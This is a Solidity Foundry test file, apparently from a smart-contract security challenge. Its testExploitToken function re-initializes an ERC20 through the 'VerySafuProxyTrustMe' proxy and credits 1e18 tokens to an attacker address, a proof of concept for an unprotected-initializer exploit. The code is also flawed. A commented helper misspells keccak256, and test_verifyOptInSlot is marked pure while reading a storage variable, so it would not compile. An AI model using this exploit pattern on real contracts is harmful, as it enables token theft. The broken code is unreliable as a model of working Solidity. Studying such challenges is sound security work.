// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {VerySafuProxyTrustMe} from "../src/VerySafuProxyTrustMe.sol";
import {ERC20} from "../src/ERC20.sol";

contract VerySafuTest is Test {
    VerySafuProxyTrustMe public verySafu;

    ERC20 erc20;

    address attacker = address(0x235);

    function setUp() public {
        erc20 = new ERC20();

        verySafu = new VerySafuProxyTrustMe(address(erc20), attacker);
        
    }

    // function test_Slot() public {
    //     uint256 balanceSlot = keccack256(abi.encodePacked(uint256(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85), uint256(3));
    //     console.log("balanceSlot:",balanceSlot);
    // }

    function testExploitToken() public {
        // Attacker reinitializes the ERC20 contract through the proxy
        (bool success,) = address(verySafu).call(abi.encodeWithSignature(
            "initialize(string,string,uint8,uint256)",
            "ExploitToken", "EXP", 18, 1e18
        ));
        require(success, "Initialization failed");

        //balance of the attacker
        uint256 balance = ERC20(address(verySafu)).balanceOf(attacker);
        assertEq(balance, 1e18, "Exploit failed: wrong balance");
    }

    function test_verifyOptInSlot() external pure returns (bool) {
    
        bytes32 computedHash = keccak256("eip1967.proxy.optIn");


        bytes32 computedSlot = bytes32(uint256(computedHash) - 1);

        return computedSlot == verySafu._OPTIN_SLOT;
    }

}
